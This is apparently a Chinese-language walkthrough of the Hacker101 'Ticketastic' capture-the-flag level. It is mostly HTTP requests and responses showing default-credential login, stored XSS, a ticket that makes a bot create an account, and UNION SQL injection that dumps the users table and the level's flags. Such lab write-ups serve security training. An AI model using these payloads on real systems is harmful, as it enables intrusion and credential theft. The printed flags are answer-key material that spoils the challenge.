## 侦察与探测

访问首页
- 请求
    ```http
    GET / HTTP/1.1
    ```
- 响应
    ```html
    <!doctype html>
    <html>

    <head>
        <title>
            Ticketastic Deluxe - Home
        </title>
    </head>

    <body>
        <h1>
            Welcome to Ticketastic
        </h1>
        <p>
            <a href="newTicket">
                Submit a Ticket
            </a>
            | <a href="login">
                Admin Login
            </a>
        </p>
        <h2>
            Support Home
        </h2>
        <p>
            If you're having problems with your installation of Ticketastic or the demo instance, please submit a ticket.
        </p>
    </body>

    </html>
    ```
- 分析
    - 仅作为其他端点的导航

访问 newticket 端点
- 请求
    ```http
    GET /newTicket HTTP/2
    ```

    - 响应
        ```html
        <h1>
            Submit Ticket
        </h1>
        <form method="POST">
            Title: <input type="text" name="title">
            <br>
            Body: <textarea cols="25" rows="5" name="body">
        </textarea>
            <br>
            <input type="submit" value="Submit">
        </form>
        ```

- 提交 ticket
    ```http
    POST /newTicket HTTP/2

    title=test_1_title&body=test_1_body
    ```

    - 响应 200
        ```
        Thanks for your submission.  We will get back to you as soon as possible.
        ```

访问管理员登录端点
- 请求
    ```http
    GET /login HTTP/1.1
    ```
    - 响应
        ```html
        <h1>
            Admin Login
        </h1>
        <form method="POST">
            Username: <input type="text" name="username">
            <br>
            Password: <input type="password" name="password">
            <br>
            <input type="submit" value="Login">
        </form>
        ```

- 提交任意登录数据
    ```http
    POST /login HTTP/1.1

    username=wiener&password=peter
    ```
    - 响应 200
        ```
        Invalid username
        ```
        - 显示无效用户名而不是通用错误，暴破有效用户名

访问根目录暴破的管理端点
- 请求
    ```http
    GET /admin HTTP/2
    ```
    - 响应 200
        ```
        Not logged in
        ```

模糊测试 newticket 端点
- 设置
    ```http
    POST /newTicket HTTP/2

    title=§§&body=§§
    ```
    - 结果
        - 普通 https 字符串与 XML 带外载荷导致服务器超时
            ```
            title=x&body=https://id.oastify.com
            ```
        - https 字符串收到 DNS 请求

严重缺乏信息
- 查看 Hint
    ```md
    Flag0 
    - 本关卡与 Ticketastic 演示实例运行的是相同的代码
    - 查看演示实例上的 `addUser`
    - 缺少了什么？
    ```
- 访问 demo
    - 访问首页，响应
        ```
        在您选择为组织购买 Ticketastic 之前，欢迎试用此演示实例。所有功能均已开放，只需使用 admin/admin 登录即可。如果您遇到任何问题，请在我们的官方实例上提交工单——此处提交的工单只有知识库机器人会查看。
        ```
        - 揭示
            - 默认凭证 `admin/admin`
            - 工单的确被后端机器人查看

    - 使用凭据登录
        ```http
        POST /login HTTP/1.1

        username=admin&password=admin
        ```
        - 响应 
            ```http
            HTTP/2 302 Found
            Location: https://id.ctf.hacker101.com/admin
            Set-Cookie: session_level7a=eyJ1c2VyIjoiYWRtaW4ifQ.HYP4SA.g3hjX5nt3XL8j2LqGovWaSnWIlQ; HttpOnly; Path=/
            ```
            - 会话 cookie 使用伪 JWT 格式，第一段为
                ```json
                {"user":"admin"}
                ```
    
    - 跟踪重定向
        ```http
        GET /admin HTTP/1.1
        Cookie: session_level7a=eyJ1c2VyIjoiYWRtaW4ifQ.HYP4SA.g3hjX5nt3XL8j2LqGovWaSnWIlQ
        ```
        - 响应
            ```html
            <h1>
                Admin Home
            </h1>
            <a href="newUser">
                Create a new user
            </a>
            <h2>
                Pending Tickets
            </h2>
            <ul>

                <li>
                    <a href="ticket?id=1">
                        Example Ticket
                    </a>
                </li>

                <li>
                    <a href="ticket?id=2">
                        foo
                    </a>
                </li>
            ```
            - 揭示
                - 端点 
                    - `/newUser`
                    - `ticket?id=1`
                - ticket 标题位于锚点元素内
            
            - 测试
                - [x] ticket XSS

    - ticket XSS 测试
        ```
        POST /newTicket HTTP/2

        title=<h3>title_test</h3>&body=<h3>body_test</h3>
        ```
        - 查看管理首页
            ```html
            <li>
                <a href="ticket?id=6">
                    <h3>
                        title_test
                    </h3>
                </a>
            </li>
            ```
            - 确认 title 的 XSS 注入
        
        - 查看测试 ticket
            ```html
            <h1>
                <h3>
                    title_test
                </h3>
            </h1>
            <pre>
                <h3>
                    body_test
                </h3>
            </pre>
            ```
            - 确认两个参数均作为 XSS 注入点

    - 访问 newUser 端点
        ```http
        GET /newUser HTTP/2
        Cookie: session_level7a=eyJ1c2VyIjoiYWRtaW4ifQ.HYP4SA.g3hjX5nt3XL8j2LqGovWaSnWIlQ
        ```
        - 响应
            ```html
            <h1>
                New User
            </h1>
            <form method="GET">
                Username: <input type="text" name="username">
                <br>
                Password: <input type="password" name="password">
                <br>
                Repeat password: <input type="password" name="password2">
                <br>
                <input type="submit" value="Create">
            </form>
            ```
            - GET 方法的创建用户表单

    - 尝试创建用户
        ```http
        GET /newUser?username=wiener&password=peter&password2=peter HTTP/2
        ```
        - 响应
            ```http
            Set-Cookie: session_level7a=eyJ1c2VyIjoid2llbmVyIn0.HYP-1A.-eJKxb2LmUiPsPUMOr7kxUg9zm4; HttpOnly; Path=/
            ```
            - 伪 JWT 第一段解码 
                ```json
                {"user":"wiener"}
                ```

返回 live
- 分析
    - 已知创建用户 URL
        - 使用 GET 及查询参数
    - 已知 ticket 存在 XSS
    - 已知 ticket 的 body 中的 URL 将被访问

- 构造创建 URL 用户 ticket

    - localhost
        ```http
        POST /newTicket HTTP/2

        title=payload_1&body=<@urlencode>https://localhost/newUser?username=wiener&password=peter&password2=peter</@urlencode>
        ```
        - 无效

    - host
        ```
        title=payload_1&body=<@urlencode>https://id.ctf.hacker101.com/newUser?username=wiener&password=peter&password2=peter</@urlencode>
        ```
        - 无效

    - 似乎仅解析主机从而拥有 DNS，即使对本机仍无完全链接访问

- 构造 XSS 载荷
    - JS

        ```
        title=<@urlencode><script>fetch('/newUser?username=wiener&password=peter&password2=peter',{method:'GET',credentials:'include'});</script><@urlencode>&body=<@urlencode><script>fetch('/newUser?username=wiener&password=peter&password2=peter',{method:'GET',credentials:'include'});</script><@urlencode>
        ```
        - 无效

- 继续调整 URL
    ```
    title=x&body=<@urlencode>http://localhost/newUser?username=wiener&password=peter&password2=peter</@urlencode>
    ```
    - 成功

        ```http
        HTTP/2 302 Found
        Location: https://id.ctf.hacker101.com/admin
        Set-Cookie: session_level7b=eyJ1c2VyIjoid2llbmVyIn0.HYQGug.ZajleJPwegKAdOmNe_g3nmbACgw; HttpOnly; Path=/
        ```

- 追踪重定向到管理员端点，响应
    ```html
    <body>
        <h1>
            Admin Home
        </h1>
        <a href="newUser">
            Create a new user
        </a>
        <h2>
            Pending Tickets
        </h2>
        <ul>

            <li>
                <a href="ticket?id=1">
                    Flag Won't Work
                </a>
            </li>

            <li>
                <a href="ticket?id=2">
                    payload_1
                </a>
            </li>
    ```

- 访问 ticket id=1
    ```http
    GET /ticket?id=1 HTTP/2
    Cookie: session_level7b=eyJ1c2VyIjoid2llbmVyIn0.HYQGug.ZajleJPwegKAdOmNe_g3nmbACgw
    ```
    - 响应
        ```html
        <head>
            <title>
                Ticketastic Deluxe - Ticket "Flag Won't Work"
            </title>
        </head>

        <body>
            <h1>
                Flag Won't Work
            </h1>
            <pre>
            I got the flag ^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$ but the site rejects it.  Any thoughts?
        </pre>
            <h2>
                Our Reply
            </h2>
            <pre>
            Yeah, the correct flag is ^FLAG^bc398fa1cc27707b8d3702c99696d63e7aec7b9a98c25a13e7590a1fc65305c0$FLAG$.  Let me know if you have any problems!
        </pre>
        ```
测试 ticket id 索引
- `/ticket?id=0`
    ```log
    Traceback (most recent call last):
    File "./main.py", line 79, in ticket
        title, body, reply = cur.fetchone()
    TypeError: 'NoneType' object is not iterable
    ```
    - 揭示
        - 后端语言 python
        - id 在数据库查询语句中

- `/ticket?id=x`
    ```log
    Traceback (most recent call last):
    File "./main.py", line 78, in ticket
        cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
    File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
        self.errorhandler(self, exc, value)
    File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
        raise errorvalue
    OperationalError: (1054, "Unknown column 'x' in 'where clause'")
    ```
    - 揭示
        - 数据库 MySQL

    - 上下文语句
        ```sql
        SELECT title, body, reply FROM tickets WHERE id=%s
        ```
- 基于已知 SQL 查询语句，构造测试 SQLi

    ```sql
    0 UNION SELECT null,null,null
    ```
    - 响应
        ```html
        <head>
            <title>
                Ticketastic Deluxe - Ticket "None"
            </title>
        </head>

        <body>
            <h1>
                None
            </h1>
            <pre>
            None
        </pre>
            <h2>
                Our Reply
            </h2>
            <i>
                No reply yet
            </i>
        </body>
        ```
- 继续构造拥有回显的 UNION 查询
    - 数据库
        ```sql 
        0 UNION SELECT null,group_concat(schema_name, ', '),null FROM information_schema.schemata
        ```
        - 此处仅显示单行结果，使用合并函数连接结果
        > group_concat 语法错误
        - 响应
            ```log
            information_schema, ,level7, ,mysql, ,performance_schema,
            ```

    - 表
        ```sql
        0 UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='level7'
        ```
        - 响应
            ```log
            tickets,users
            ```
    - 列

        ```sql
        0 UNION SELECT null,null,group_concat(column_name, ', ') FROM information_schema.columns WHERE table_name='users'
        ```
        - 响应
            ```log
            id, ,username, ,password, ,USER, ,CURRENT_CONNECTIONS, ,TOTAL_CONNECTIONS, 
            ```
    
    - 数据
        ```sql
        0 UNION SELECT null,null,group_concat(concat_ws(' ', id, username, password) SEPARATOR ', ') FROM level7.users
        ```
        - 响应
            ```log
            1 admin ^FLAG^aab708fe5317dd9ce4f4643ff5543078f3f6ec7397646b8945804e1899e028c3$FLAG$, 2 wiener peter, 3  peter
            ```

## 功能端点

`/`
- 功能
    - 作为其他端点的导航

`/newTicket`
- 功能
    - GET 得到 ticket 表单
    - POST 提交 ticket
- 参数
    - POST
        - `title`
        - `body`
- 测试
    - [x] 针对管理员显示信息的载荷
        - XML 与普通 https URL 在协作服务器得到 DNS 请求
        - 模拟受害者访问 URL
    - [x] HTTP 方法

`/login`
- 功能
    - GET 得到登录表单
    - POST 提交登录表单
- 参数
    - POST 
        - `username`
        - `password`
- 测试
    - [x] 用户名暴破
        - 无
    - [x] SQL 注入
        - 特殊字符导致服务器响应 500 异常
        
`/admin` 根目录暴破
- 功能
    - GET 需登录
- 测试
    - [x] 访问控制，绕过登录
        - [x] host 头覆盖
            - 无
        - [x] IP 头覆盖
            - 无
        - [x] HTTP 方法
            - 无
    - demo 揭示 ticket title 字段的储存型 XSS

`/newUser` demo 揭示端点
- 功能
    - GET 返回创建用户表单，设置参数提交创建
- 参数
    - GET
        - `username`
        - `password`
        - `password2`

`/ticket?id=1` demo 揭示端点
- 功能
    - GET 查看 ticket 详情
- 参数 
    - GET
        - `id` ticket 编号
- 测试
    - demo 揭示的 title 与 body 字段的储存型 XSS
    - SQL 注入

命名风格
- 驼峰
    ```
    newTicket
    newUser
    ```

## 错误信息

```py
# ./main.py

78: cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
79: title, body, reply = cur.fetchone()
```
